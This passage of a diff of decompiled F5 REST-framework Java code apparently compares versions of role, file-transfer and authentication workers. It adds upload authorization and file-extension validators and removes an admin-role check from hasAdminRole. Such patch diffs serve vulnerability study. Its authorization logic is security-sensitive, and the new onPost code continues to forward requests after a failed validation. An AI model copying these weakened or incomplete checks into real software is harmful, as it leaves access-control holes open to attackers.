(!this.userLinkToRoleNames.containsKey(userLink)) {\r\n       return false;\r\n     }\r\n\r\n     synchronized (this.userLinkToRoleNames) {\r\n\r\n       if (!this.userLinkToRoleNames.containsKey(userLink)) {\r\n         return false;\r\n       }\r\n\r\n       for (String roleName : this.userLinkToRoleNames.get(userLink)) {\r\n         RoleResourceMatcher resources = this.roleNameToResources.get(roleName);\r\n         if (resources.verifyResourceIsPermitted(path, verb)) {\r\n           return true;\r\n         }\r\n       }\r\n     }\r\n     return false;\r\n   }\r\n\r\n   public void hasAdminRole(RestOperation request, CompletionHandler<Boolean> completion) {\r\n     for (RestReference groupReference : request.getAuthGroupReferencesList()) {\r\n       if (hasAdminRoleFromGroup(groupReference)) {\r\n         completion.completed(Boolean.valueOf(true));\r\n         return;\r\n       }\r\n     }\r\n     RestReference authUserReference = request.getAuthUserReference();\r\n     if (RestReference.isNullOrEmpty(authUserReference)) {\r\n       completion.completed(null);\r\n       return;\r\n     }\r\n-    if (!hasAdminRoleFromGroup(authUserReference)) {\r\n-      completion.completed(null);\r\n-      return;\r\n-    }\r\n     this.tmosRoleCache.get(authUserReference.link, completion);\r\n   }\r\n\r\n   private boolean hasAdminRoleFromGroup(RestReference userLink) {\r\n     if (!this.userLinkToRoleNames.containsKey(userLink)) {\r\n       return false;\r\n     }\r\n     synchronized (this.userLinkToRoleNames) {\r\n       Set<String> roleNames = this.userLinkToRoleNames.get(userLink);\r\n       return (roleNames != null && roleNames.contains(\"Administrator\"));\r\n     }\r\n   }\r\n\r\n   private RoleResourceMatcher buildResourcesList(RolesWorkerState role) {\r\n     Set<RoleResource> resources = new HashSet<>();\r\n\r\n     if (role.resources != null) {\r\n       resources.addAll(role.resources);\r\n     }\r\n\r\n     if (role.resourceGroupReferences != null) {\r\n       for (RestReference resourceGroupReference : role.resourceGroupReferences) {\r\n         if (RestReference.isNullOrEmpty(resourceGroupReference)) {\r\n           continue;\r\n         }\r\n         Set<RoleResource> groupResources = this.resourcesGroupWorker.getRoleResourcesFromGroup(resourceGroupReference.link);\r\n\r\n         if (groupResources != null) {\r\n           resources.addAll(groupResources);\r\n         }\r\n       }\r\n     }\r\n\r\n     return new RoleResourceMatcher(resources);\r\n   }\r\n\r\n\r\n\r\n   private void queueUserRemoval(RestReference userReference) {\r\n     getLogger().fineFmt(\"Queued removal of %s from roles.\", new Object[] { userReference.link });\r\n\r\n     synchronized (this.userLinkToRoleNames) {\r\n       if (!this.userLinkToRoleNames.containsKey(userReference)) {\r\n         return;\r\n       }\r\n     }\r\n\r\n     this.usersToRemove.add(userReference);\r\n     processUserRemovalQueue();\r\n   }\r\n\r\n\r\n   private void completedUserRemoval() {\r\n     this.isUserRemovalRunning.set(false);\r\n     processUserRemovalQueue();\r\n   }\r\n\r\n   private void processUserRemovalQueue() {\r\n     if (this.isUserRemovalRunning.compareAndSet(false, true)) {\r\n       removeNextUser();\r\n     }\r\n   }\r\n\r\n   private void removeNextUser() {\r\n     RestReference userRef = this.usersToRemove.poll();\r\n\r\n     if (userRef == null) {\r\n       this.isUserRemovalRunning.set(false);\r\n\r\n       return;\r\n     }\r\n     getLogger().fineFmt(\"Processing %s for removal from roles\", new Object[] { userRef.link });\r\n\r\n     Set<String> roles = null;\r\n\r\n     synchronized (this.userLinkToRoleNames) {\r\n       if (this.userLinkToRoleNames.containsKey(userRef)) {\r\n         roles = new HashSet<>(this.userLinkToRoleNames.get(userRef));\r\n       }\r\n     }\r\n\r\n     if (roles == null || roles.isEmpty()) {\r\n       completedUserRemoval();\r\n\r\n       return;\r\n     }\r\n     for (String role : roles) {\r\n       removeUserFromRole(userRef, role);\r\n     }\r\n   }\r\n\r\n\r\n   private void removeUserFromRole(final RestReference userReference, final String roleName) {\r\n     RestRequestCompletion getCompletion = new RestRequestCompletion()\r\n       {\r\n\r\n\r\n\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           RolesWorker.this.getLogger().fineFmt(\"Unable to GET %s to remove %s: %s\", new Object[] { this.val$roleName, this.val$userReference.link.toString(), ex });\r\n\r\n           RolesWorker.this.completedUserRemoval();\r\n         }\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           final RolesWorkerState role = (RolesWorkerState)operation.getTypedBody(RolesWorkerState.class);\r\n           if (!role.userReferences.remove(userReference) && !\"Administrator\".equals(roleName)) {\r\n\r\n             RolesWorker.this.completedUserRemoval();\r\n             return;\r\n           }\r\n           RestRequestCompletion putCompletion = new RestRequestCompletion()\r\n             {\r\n\r\n               public void failed(Exception ex, RestOperation putResponse)\r\n               {\r\n                 if (putResponse.getStatusCode() == 404) {\r\n                   RolesWorker.this.completedUserRemoval();\r\n\r\n                   return;\r\n                 }\r\n                 RolesWorker.this.getLogger().fineFmt(\"Unable to update %s to remove %s, will retry. Error: %s\", new Object[] { this.val$role.name, this.this$1.val$userReference.link.toString(), ex });\r\n\r\n\r\n\r\n                 RolesWorker.this.queueUserRemoval(userReference);\r\n               }\r\n\r\n\r\n\r\n               public void completed(RestOperation putResponse) {\r\n                 RolesWorker.this.getLogger().fineFmt(\"Successfully removed %s from role %s\", new Object[] { this.this$1.val$userReference.link.toString(), this.val$role.name });\r\n\r\n                 RolesWorker.this.completedUserRemoval();\r\n               }\r\n             };\r\n\r\n\r\n           RestOperation put = RestOperation.create().setUri(UrlHelper.extendUriSafe(RolesWorker.this.getUri(), new String[] { this.val$roleName })).setBody(role).setCompletion(putCompletion);\r\n\r\n\r\n\r\n           RolesWorker.this.sendPut(put);\r\n         }\r\n       };\r\n\r\n     RestOperation get = RestOperation.create().setUri(UrlHelper.extendUriSafe(getUri(), new String[] { roleName })).setCompletion(getCompletion);\r\n\r\n\r\n     sendGet(get);\r\n   }\r\n\r\n   void removeResourceGroupsFromRoles(RestReference groupReference) {\r\n     Set<String> roles = null;\r\n\r\n     synchronized (this.userLinkToRoleNames) {\r\n       if (this.resourceGroupToRoleNames.containsKey(groupReference)) {\r\n         roles = new HashSet<>(this.resourceGroupToRoleNames.get(groupReference));\r\n       }\r\n     }\r\n\r\n     if (roles == null) {\r\n       return;\r\n     }\r\n\r\n     for (String role : roles) {\r\n       removeResourceGroupFromRole(groupReference, role, 10);\r\n     }\r\n   }\r\n\r\n\r\n\r\n   void removeResourceGroupFromRole(final RestReference groupReference, final String roleName, final int retries) {\r\n     RestRequestCompletion getCompletion = new RestRequestCompletion()\r\n       {\r\n\r\n\r\n\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           RolesWorker.this.getLogger().fineFmt(\"Failed to remove %s from role %s: %s\", new Object[] { this.val$groupReference.link.toString(), this.val$roleName, ex });\r\n         }\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           final RolesWorkerState role = (RolesWorkerState)operation.getTypedBody(RolesWorkerState.class);\r\n           if (!role.resourceGroupReferences.remove(groupReference)) {\r\n             return;\r\n           }\r\n           RestRequestCompletion putCompletion = new RestRequestCompletion()\r\n             {\r\n\r\n\r\n\r\n               public void failed(Exception ex, RestOperation putResponse)\r\n               {\r\n                 if (retries <= 0) {\r\n                   RolesWorker.this.getLogger().warningFmt(\"Failed to remove %s from role %s: %s\", new Object[] { this.this$1.val$groupReference.link.toString(), this.val$role.name, ex });\r\n\r\n                   return;\r\n                 }\r\n                 TimerTask task = new TimerTask()\r\n                   {\r\n                     public void run()\r\n                     {\r\n                       RolesWorker.this.removeResourceGroupFromRole(groupReference, roleName, retries - 1);\r\n                     }\r\n                   };\r\n\r\n\r\n\r\n                 RolesWorker.this.scheduleTask(task, true, (10 - retries) * 10, 0, 1);\r\n               }\r\n\r\n\r\n               public void completed(RestOperation putResponse) {\r\n                 RolesWorker.this.getLogger().fineFmt(\"Successfully removed %s from role %s\", new Object[] { this.this$1.val$groupReference.link.toString(), this.val$role.name });\r\n               }\r\n             };\r\n\r\n\r\n\r\n           RestOperation put = RestOperation.create().setUri(UrlHelper.extendUriSafe(RolesWorker.this.getUri(), new String[] { this.val$roleName })).setBody(role).setCompletion(putCompletion);\r\n\r\n\r\n\r\n           RolesWorker.this.sendPut(put);\r\n         }\r\n       };\r\n\r\n     RestOperation get = RestOperation.create().setUri(UrlHelper.extendUriSafe(getUri(), new String[] { roleName })).setCompletion(getCompletion);\r\n\r\n\r\n     sendGet(get);\r\n   }\r\n\r\n\r\n   void rebuildRolesWithRef(final URI resourceGroupSelfLink, final RestOperation groupRequest) {\r\n     RestRequestCompletion getCollectionCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           RolesWorker.this.getLogger().warningFmt(\"Failed to rebuild role resources: %s\", new Object[] { RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           RolesCollectionState collection = (RolesCollectionState)operation.getTypedBody(RolesCollectionState.class);\r\n\r\n\r\n           RestReference resourceGroup = new RestReference(resourceGroupSelfLink);\r\n           RolesWorker.this.rebuildResources(collection, resourceGroup);\r\n           RolesWorker.this.resourcesGroupWorker.onRoleRebuildComplete(groupRequest);\r\n         }\r\n       };\r\n\r\n\r\n     loadChildValues(getCollectionCompletion);\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   void rebuildAllRoles() {\r\n     RestRequestCompletion getCollectionCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           RolesWorker.this.getLogger().warningFmt(\"Failed to rebuild role resources: %s\", new Object[] { RestHelper.throwableStackToString(ex) });\r\n         }\r\n\r\n\r\n\r\n         public void completed(RestOperation operation) {\r\n           RolesCollectionState collection = (RolesCollectionState)operation.getTypedBody(RolesCollectionState.class);\r\n\r\n           synchronized (RolesWorker.this.userLinkToRoleNames) {\r\n             for (RolesWorkerState role : collection.items) {\r\n               RolesWorker.this.roleNameToResources.put(role.name, RolesWorker.this.buildResourcesList(role));\r\n             }\r\n           }\r\n         }\r\n       };\r\n\r\n\r\n     loadChildValues(getCollectionCompletion);\r\n   }\r\n\r\n\r\n   void rebuildResources(RolesCollectionState collection, RestReference resourceGroup) {\r\n     synchronized (this.userLinkToRoleNames) {\r\n       Set<String> roleNames = this.resourceGroupToRoleNames.get(resourceGroup);\r\n       if (roleNames == null) {\r\n         return;\r\n       }\r\n\r\n       for (RolesWorkerState role : collection.items) {\r\n         if (roleNames.contains(role.name)) {\r\n           this.roleNameToResources.put(role.name, buildResourcesList(role));\r\n         }\r\n       }\r\n     }\r\n   }\r\n\r\n\r\n   public static void failWithPermissionsInternalError(RestOperation request) {\r\n     request.setBody(null);\r\n     request.setStatusCode(500);\r\n     request.fail(new Exception(\"Internal server error while authorizing request\"));\r\n   }\r\n\r\n   public void invalidateCacheForUser(URI userSelfLink) {\r\n     this.tmosRoleCache.invalidate(userSelfLink);\r\n   }\r\n }\r\ndiff --git a/com/f5/rest/workers/asm/AsmFileTransferConfiguration.java b/com/f5/rest/workers/asm/AsmFileTransferConfiguration.java\r\nnew file mode 100644\r\nindex 0000000..99c2bd4\r\n--- /dev/null\r\n+++ b/com/f5/rest/workers/asm/AsmFileTransferConfiguration.java\r\n@@ -0,0 +1,26 @@\r\n+package com.f5.rest.workers.asm;\r\n+\r\n+import java.util.ArrayList;\r\n+import java.util.List;\r\n+\r\n+public class AsmFileTransferConfiguration\r\n+{\r\n+  List<String> allowedFileFormat = new ArrayList<>();\r\n+\r\n+  public List<String> getAllowedFileFormat() {\r\n+    return this.allowedFileFormat;\r\n+  }\r\n+\r\n+  public void setAllowedFileFormat(List<String> paramList) {\r\n+    this.allowedFileFormat = paramList;\r\n+  }\r\n+\r\n+  public String getAllowedFileFormatAsString(String paramString) {\r\n+    StringBuilder stringBuilder = new StringBuilder();\r\n+    for (String str : this.allowedFileFormat) {\r\n+      stringBuilder.append(str).append(paramString);\r\n+    }\r\n+    stringBuilder.deleteCharAt(stringBuilder.lastIndexOf(paramString));\r\n+    return stringBuilder.toString();\r\n+  }\r\n+}\r\ndiff --git a/com/f5/rest/workers/asm/AsmFileTransferWorker.java b/com/f5/rest/workers/asm/AsmFileTransferWorker.java\r\nindex 87e0610..16144f9 100644\r\n--- a/com/f5/rest/workers/asm/AsmFileTransferWorker.java\r\n+++ b/com/f5/rest/workers/asm/AsmFileTransferWorker.java\r\n@@ -1,133 +1,162 @@\r\n package com.f5.rest.workers.asm;\r\n\r\n import com.f5.rest.common.RestOperation;\r\n import com.f5.rest.common.RestRequestCompletion;\r\n import com.f5.rest.common.RestServer;\r\n import com.f5.rest.common.RestWorker;\r\n import com.f5.rest.common.UrlHelper;\r\n-import com.f5.rest.workers.FileTransferWorker;\r\n+import com.f5.rest.workers.FileTransferPrivateWorker;\r\n+import com.f5.rest.workers.asm.utils.AsmRequestValidator;\r\n+import com.f5.rest.workers.asm.utils.ValidationResponse;\r\n import java.net.URI;\r\n import java.util.ArrayList;\r\n import java.util.List;\r\n+import java.util.logging.Logger;\r\n\r\n\r\n\r\n public class AsmFileTransferWorker\r\n   extends RestWorker\r\n {\r\n+  private final Logger LOGGER = Logger.getLogger(AsmFileTransferWorker.class.getSimpleName());\r\n   private String postDirectory;\r\n   private String tmpDirectory;\r\n   private String getDirectory;\r\n   private final String PRIVATE_SUFFIX = \"-private\";\r\n   private boolean isDownload;\r\n   private String localUri;\r\n\r\n   public AsmFileTransferWorker(String paramString1, String paramString2, String paramString3) throws Exception {\r\n     this.postDirectory = paramString2;\r\n     this.tmpDirectory = paramString3;\r\n     this.isDownload = false;\r\n     this.localUri = paramString1;\r\n   }\r\n\r\n   public AsmFileTransferWorker(String paramString1, String paramString2) throws Exception {\r\n     this.getDirectory = paramString2;\r\n     this.isDownload = true;\r\n     this.localUri = paramString1;\r\n   }\r\n\r\n\r\n\r\n   public void onStart(RestServer paramRestServer) throws Exception {\r\n     if (this.isDownload) {\r\n\r\n-      FileTransferWorker fileTransferWorker = new FileTransferWorker(this.getDirectory);\r\n-      fileTransferWorker.setPublic(false);\r\n-      getServer().registerWorker(this.localUri + \"-private\", (RestWorker)fileTransferWorker);\r\n+      FileTransferPrivateWorker fileTransferPrivateWorker = new FileTransferPrivateWorker(this.getDirectory);\r\n+      fileTransferPrivateWorker.setPublic(false);\r\n+      getServer().registerWorker(this.localUri + \"-private\", (RestWorker)fileTransferPrivateWorker);\r\n     }\r\n     else {\r\n\r\n-      FileTransferWorker fileTransferWorker = new FileTransferWorker(this.postDirectory, this.tmpDirectory);\r\n-      fileTransferWorker.setPublic(false);\r\n-      getServer().registerWorker(this.localUri + \"-private\", (RestWorker)fileTransferWorker);\r\n+      FileTransferPrivateWorker fileTransferPrivateWorker = new FileTransferPrivateWorker(this.postDirectory, this.tmpDirectory);\r\n+      fileTransferPrivateWorker.setPublic(false);\r\n+      getServer().registerWorker(this.localUri + \"-private\", (RestWorker)fileTransferPrivateWorker);\r\n     }\r\n\r\n     ArrayList<String> arrayList = new ArrayList();\r\n     arrayList.add(\"/*\");\r\n     getServer().registerCollectionWorker(arrayList, this);\r\n     registerPublicUri(getUri().getPath(), null);\r\n\r\n     super.onStart(paramRestServer);\r\n   }\r\n\r\n\r\n   protected void forwardRequest(final RestOperation request) {\r\n     List list = request.getParsedCollectionEntries();\r\n     RestOperation restOperation = (RestOperation)request.clone();\r\n\r\n+\r\n     URI uRI = getUri();\r\n     try {\r\n       if (list == null || list.size() == 0) {\r\n         uRI = UrlHelper.buildLocalUri(getServer(), new String[] { this.localUri + \"-private\" });\r\n       } else {\r\n\r\n         String str1 = request.getAuthUser();\r\n         String str2 = str1 + \"~\" + ((RestOperation.ParsedCollectionEntry)list.get(0)).entryKey;\r\n         uRI = UrlHelper.buildLocalUri(getServer(), new String[] { this.localUri + \"-private\", \"/\", str2 });\r\n       }\r\n\r\n     } catch (Exception exception) {}\r\n\r\n\r\n     restOperation.setUri(uRI).setCompletion(new RestRequestCompletion()\r\n         {\r\n           public void completed(RestOperation param1RestOperation) {\r\n             String str = param1RestOperation.getBodyAsString();\r\n             if (str == null || str.isEmpty()) {\r\n               request.setBinaryBody(param1RestOperation.getBinaryBody());\r\n             } else {\r\n\r\n               request.setBody(str);\r\n             }\r\n\r\n             request.complete();\r\n           }\r\n\r\n\r\n           public void failed(Exception param1Exception, RestOperation param1RestOperation) {\r\n             request.fail(param1Exception);\r\n           }\r\n         });\r\n     sendRequest(restOperation);\r\n   }\r\n\r\n\r\n\r\n   protected void onGet(RestOperation paramRestOperation) {\r\n     forwardRequest(paramRestOperation);\r\n   }\r\n\r\n\r\n   protected void onQuery(RestOperation paramRestOperation) {\r\n     forwardRequest(paramRestOperation);\r\n   }\r\n\r\n\r\n   protected void onPost(RestOperation paramRestOperation) {\r\n+    this.LOGGER.info(\"Validating the request\");\r\n+    ValidationResponse validationResponse1 = validateRequest(paramRestOperation);\r\n+    if (!validationResponse1.isValid()) {\r\n+      paramRestOperation.setStatusCode(401);\r\n+      paramRestOperation.fail(new SecurityException(validationResponse1.getMessage()));\r\n+    }\r\n+    ValidationResponse validationResponse2 = AsmRequestValidator.validateFileExtension(paramRestOperation);\r\n+    if (!validationResponse2.isValid()) {\r\n+      paramRestOperation.fail(new IllegalArgumentException(validationResponse2.getMessage()));\r\n+    }\r\n     forwardRequest(paramRestOperation);\r\n   }\r\n\r\n\r\n   protected void onDelete(RestOperation paramRestOperation) {\r\n     forwardRequest(paramRestOperation);\r\n   }\r\n\r\n\r\n   protected void onPatch(RestOperation paramRestOperation) {\r\n     forwardRequest(paramRestOperation);\r\n   }\r\n\r\n\r\n   protected void onPut(RestOperation paramRestOperation) {\r\n     forwardRequest(paramRestOperation);\r\n   }\r\n+\r\n+  private ValidationResponse validateRequest(RestOperation paramRestOperation) {\r\n+    ValidationResponse validationResponse = AsmRequestValidator.validateUserAuthorization(paramRestOperation);\r\n+    if (!validationResponse.isValid()) {\r\n+\r\n+      ValidationResponse validationResponse1 = AsmRequestValidator.validateUserHasFullAuthorization(paramRestOperation);\r\n+      if (!validationResponse1.isValid()) {\r\n+        return validationResponse;\r\n+      }\r\n+      return new ValidationResponse(true);\r\n+    }\r\n+\r\n+    return validationResponse;\r\n+  }\r\n }\r\ndiff --git a/com/f5/rest/workers/asm/utils/AsmRequestValidator.java b/com/f5/rest/workers/asm/utils/AsmRequestValidator.java\r\nnew file mode 100644\r\nindex 0000000..6f80b68\r\n--- /dev/null\r\n+++ b/com/f5/rest/workers/asm/utils/AsmRequestValidator.java\r\n@@ -0,0 +1,119 @@\r\n+package com.f5.rest.workers.asm.utils;\r\n+\r\n+import com.f5.mcp.data.DataObject;\r\n+import com.f5.mcp.io.Connection;\r\n+import com.f5.mcp.io.ConnectionManager;\r\n+import com.f5.mcp.io.ObjectManager;\r\n+import com.f5.mcp.schema.SchemaAttribute;\r\n+import com.f5.mcp.schema.SchemaStructured;\r\n+import com.f5.mcp.schema.auth.AuthModule;\r\n+import com.f5.mcp.schema.auth.UserRolePartition;\r\n+import com.f5.mcp.schema.common.McpUserRoleT;\r\n+import com.f5.rest.common.RestOperation;\r\n+import com.f5.rest.workers.asm.AsmFileTransferConfiguration;\r\n+import com.f5.rest.workers.filemanagement.FileManagementHelper;\r\n+import com.google.gson.Gson;\r\n+import java.io.BufferedReader;\r\n+import java.io.File;\r\n+import java.io.FileNotFoundException;\r\n+import java.io.FileReader;\r\n+import java.util.ArrayList;\r\n+import java.util.Arrays;\r\n+import java.util.List;\r\n+import java.util.logging.Logger;\r\n+import java.util.regex.Pattern;\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+public class AsmRequestValidator\r\n+{\r\n+  private static final Logger LOGGER = Logger.getLogger(AsmRequestValidator.class.getName());\r\n+  private static final String MCP_PARTITION_ALL = \"[All]\";\r\n+  private static final String MCP_PARTITION_COMMON = \"Common\";\r\n+  private static final ArrayList<McpUserRoleT> allowedRoles = new ArrayList<>(Arrays.asList(new McpUserRoleT[] { McpUserRoleT.ROLE_APPLICATION_SECURITY_ADMINISTRATOR, McpUserRoleT.ROLE_APPLICATION_SECURITY_OPERATIONS_ADMINISTRATOR, McpUserRoleT.ROLE_RESOURCE_ADMIN, McpUserRoleT.ROLE_ADMINISTRATOR, McpUserRoleT.ROLE_APPLICATION_SECURITY_EDITOR }));\r\n+\r\n+\r\n+\r\n+\r\n+\r\n+  private static String ALLOWED_FILE_FORMATS_CONFIG = \"/etc/asm-file-transfer-config.json\";\r\n+  private static String FILE_REGEX;\r\n+\r\n+  static {\r\n+    try {\r\n+      File file = new File(ALLOWED_FILE_FORMATS_CONFIG);\r\n+      BufferedReader bufferedReader = new BufferedReader(new FileReader(file));\r\n+      AsmFileTransferConfiguration asmFileTransferConfiguration = (AsmFileTransferConfiguration)(new Gson()).fromJson(bufferedReader, AsmFileTransferConfiguration.class);\r\n+      String str = asmFileTransferConfiguration.getAllowedFileFormatAsString(\"|\");\r\n+      FILE_REGEX = \"^[a-zA-Z0-9_. -~\\\\(\\\\)\\\\%]+\\\\.(\" + str + \")\";\r\n+    } catch (FileNotFoundException fileNotFoundException) {\r\n+      LOGGER.severe(\"FILE REGEX validator was not calculated:\" + fileNotFoundException.getMessage());\r\n+    }\r\n+  }\r\n+\r\n+  public static ValidationResponse validateUserAuthorization(RestOperation paramRestOperation) {\r\n+    String str = paramRestOperation.getAuthUser();\r\n+    if (str == null) {\r\n+      return new ValidationResponse(false, \"Could not get the authorized username for this incoming request\");\r\n+    }\r\n+\r\n+    boolean bool = (str.equals(\"admin\") || str.equals(\"root\")) ? true : false;\r\n+    return new ValidationResponse(bool, String.format(\"User '%s' is not authorized\", new Object[] { str }));\r\n+  }\r\n+\r\n+  public static ValidationResponse validateUserHasFullAuthorization(RestOperation paramRestOperation) {\r\n+    ConnectionManager connectionManager = ConnectionManager.instance();\r\n+    if (connectionManager == null) {\r\n+      ConnectionManager.init();\r\n+      connectionManager = ConnectionManager.instance();\r\n+    }\r\n+    Connection connection = null;\r\n+    try {\r\n+      connection = connectionManager.getConnection();\r\n+      ObjectManager objectManager = new ObjectManager((SchemaStructured)AuthModule.UserRolePartition, connection);\r\n+      DataObject dataObject = objectManager.newObject();\r\n+      dataObject.put((SchemaAttribute)UserRolePartition.USER, paramRestOperation.getAuthUser());\r\n+      DataObject[] arrayOfDataObject = objectManager.getAll(dataObject);\r\n+      if (arrayOfDataObject != null) {\r\n+        for (DataObject dataObject1 : arrayOfDataObject) {\r\n+          String str = dataObject1.getString((SchemaAttribute)UserRolePartition.PARTITION);\r\n+          if (str.equals(\"[All]\") || str.equals(\"Common\")) {\r\n+            McpUserRoleT mcpUserRoleT = (McpUserRoleT)dataObject1.getToken((SchemaAttribute)UserRolePartition.ROLE);\r\n+            if (allowedRoles.contains(mcpUserRoleT)) {\r\n+              return new ValidationResponse(true);\r\n+            }\r\n+          }\r\n+        }\r\n+      }\r\n+    } catch (Exception exception) {\r\n+      return new ValidationResponse(false, exception.getMessage());\r\n+    } finally {\r\n+      if (connection != null) {\r\n+        connectionManager.freeConnection(connection);\r\n+      }\r\n+    }\r\n+    return new ValidationResponse(false);\r\n+  }\r\n+\r\n+  public static ValidationResponse validateFileExtension(RestOperation paramRestOperation) {\r\n+    List list = paramRestOperation.getParsedCollectionEntries();\r\n+    if (list == null || list.isEmpty()) {\r\n+      return new ValidationResponse(true);\r\n+    }\r\n+\r\n+    String str = ((RestOperation.ParsedCollectionEntry)list.get(0)).entryKey;\r\n+    if (!Pattern.matches(FILE_REGEX, str)) {\r\n+      FileManagementHelper.cleanPostForResponse(paramRestOperation);\r\n+      paramRestOperation.fail(new IllegalArgumentException(\"A valid file format must be supplied\"));\r\n+      return new ValidationResponse(false, \"A valid file format must be supplied\");\r\n+    }\r\n+    return new ValidationResponse(true);\r\n+  }\r\n+\r\n+  public static ValidationResponse validateRequestSource(RestOperation paramRestOperation) {\r\n+    LOGGER.info(paramRestOperation.getUri().toString());\r\n+    return new ValidationResponse(true);\r\n+  }\r\n+}\r\ndiff --git a/com/f5/rest/workers/asm/utils/ValidationResponse.java b/com/f5/rest/workers/asm/utils/ValidationResponse.java\r\nnew file mode 100644\r\nindex 0000000..109fa81\r\n--- /dev/null\r\n+++ b/com/f5/rest/workers/asm/utils/ValidationResponse.java\r\n@@ -0,0 +1,26 @@\r\n+package com.f5.rest.workers.asm.utils;\r\n+\r\n+\r\n+\r\n+public class ValidationResponse\r\n+{\r\n+  private boolean isValid;\r\n+  private String message;\r\n+\r\n+  public ValidationResponse(boolean paramBoolean) {\r\n+    this.isValid = paramBoolean;\r\n+  }\r\n+\r\n+  public ValidationResponse(boolean paramBoolean, String paramString) {\r\n+    this.isValid = paramBoolean;\r\n+    this.message = paramString;\r\n+  }\r\n+\r\n+  public String getMessage() {\r\n+    return this.message;\r\n+  }\r\n+\r\n+  public boolean isValid() {\r\n+    return this.isValid;\r\n+  }\r\n+}\r\ndiff --git a/com/f5/rest/workers/authn/AuthnWorker.java b/com/f5/rest/workers/authn/AuthnWorker.java\r\nindex 0658099..ddbe4cf 100644\r\n--- a/com/f5/rest/workers/authn/AuthnWorker.java\r\n+++ b/com/f5/rest/workers/authn/AuthnWorker.java\r\n@@ -1,555 +1,587 @@\r\n package com.f5.rest.workers.authn;\r\n\r\n import com.f5.rest.common.RestErrorResponse;\r\n import com.f5.rest.common.RestHelper;\r\n import com.f5.rest.common.RestOperation;\r\n import com.f5.rest.common.RestReference;\r\n import com.f5.rest.common.RestRequestCompletion;\r\n import com.f5.rest.common.RestRequestSender;\r\n import com.f5.rest.common.RestServer;\r\n import com.f5.rest.common.RestWorker;\r\n import com.f5.rest.common.UrlHelper;\r\n+import com.f5.rest.common.Utilities;\r\n import com.f5.rest.common.WellKnownPorts;\r\n import com.f5.rest.workers.AuthTokenItemState;\r\n import com.f5.rest.workers.RestResolverGroupEntry;\r\n import com.f5.rest.workers.authn.providers.AuthProviderCollectionState;\r\n import com.f5.rest.workers.authn.providers.AuthProviderLoginState;\r\n import com.f5.rest.workers.authn.providers.AuthProviderState;\r\n import com.f5.rest.workers.authn.providers.local.LocalAuthLoginWorker;\r\n import com.f5.rest.workers.authz.AuthSourceState;\r\n import com.f5.rest.workers.authz.AuthzHelper;\r\n import java.net.URI;\r\n import java.util.Collections;\r\n import java.util.HashMap;\r\n import java.util.Map;\r\n import java.util.concurrent.Callable;\r\n import java.util.concurrent.CancellationException;\r\n import java.util.concurrent.ExecutorService;\r\n import java.util.concurrent.Executors;\r\n import java.util.concurrent.Future;\r\n import java.util.concurrent.TimeUnit;\r\n import java.util.concurrent.TimeoutException;\r\n import java.util.concurrent.atomic.AtomicInteger;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n-\r\n public class AuthnWorker\r\n   extends RestWorker\r\n {\r\n   public static final String LOGIN_PATH_SUFFIX = \"login\";\r\n   public static final String WORKER_URI_PATH = UrlHelper.buildUriPath(new String[] { \"shared/\", \"authn\", \"login\" });\r\n\r\n   public static final String MAX_NUMBER_LOGIN_FAILURE_MSG = \"Maximum number of login attempts exceeded.\";\r\n\r\n   public static final String LOGIN_ERROR_MSG = \"Unable to login using supplied information. If you are attempting to login with a configured authentication provider it may be unavailable or no longer exist.\";\r\n\r\n   public static final int MAX_NUMBER_LOGIN_FAILURES = 5;\r\n   private static final long FAILED_ATTEMPTS_TIMEOUT = TimeUnit.MINUTES.toMicros(5L);\r\n\r\n   private static final int GET_AUTHSOURCE_MAX_WAIT_MILLIS = 800;\r\n   private static final int GET_AUTHSOURCE_BASE_WAIT_MILLIS = 10;\r\n   private static final int GET_AUTHSOURCE_EXPONENT_FACTOR = 2;\r\n   private static final int GET_AUTHSOURCE_EXPONENTIAL_ATTEMPTS = 5;\r\n   private static final int GET_AUTHSOURCE_LINEAR_FACTOR = 50;\r\n   private final int LOOKUP_AUTH_MAX_WAIT_MILLIS = (int)TimeUnit.SECONDS.toMillis(10L);\r\n   private final int LOOKUP_AUTH_MAX_RETRIES = 10;\r\n   private final Map<URI, AtomicInteger> lookupAuthRetryCountReferenceMap = Collections.synchronizedMap(new HashMap<>());\r\n\r\n   private class LoginFailures\r\n   {\r\n     public int failures = 0;\r\n     private LoginFailures() {}\r\n\r\n     public long lastFailureMicros; }\r\n   private final Map<String, RestReference> loginNameToReferenceMap = Collections.synchronizedMap(new HashMap<>());\r\n\r\n   private final Map<String, LoginFailures> loginFailureMap = Collections.synchronizedMap(new HashMap<>());\r\n\r\n\r\n   private final Map<URI, URI> subscriptions = Collections.synchronizedMap(new HashMap<>());\r\n\r\n\r\n\r\n\r\n   public void onStart(RestServer server) throws Exception {\r\n     setSynchronized(true);\r\n\r\n     setMaxPendingOperations(10000L);\r\n     setPersisted(false);\r\n     setReplicated(false);\r\n     setIndexed(false);\r\n     setPublic(true);\r\n\r\n\r\n     completeStart(null, new URI[] { UrlHelper.buildLocalUriSafe(server, new String[] { LocalAuthLoginWorker.WORKER_URI_PATH }), UrlHelper.buildLocalUriSafe(server, new String[] { \"shared/resolver/groups\" }) });\r\n   }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n   protected void onStartCompleted(Object state, Exception stateLoadEx, Exception availabilityEx) throws Exception {\r\n     subscribeToAuthProviderGroup();\r\n\r\n+\r\n+\r\n+    this.subscriptions.put(makePublicUri(LocalAuthLoginWorker.WORKER_URI_PATH), makePublicUri(LocalAuthLoginWorker.WORKER_URI_PATH));\r\n+\r\n+\r\n     super.onStartCompleted(state, stateLoadEx, availabilityEx);\r\n   }\r\n\r\n   private void subscribeToAuthProviderGroup() throws Exception {\r\n     RestRequestCompletion subscribeCompletion = new RestRequestCompletion()\r\n       {\r\n         public void failed(Exception ex, RestOperation operation)\r\n         {\r\n           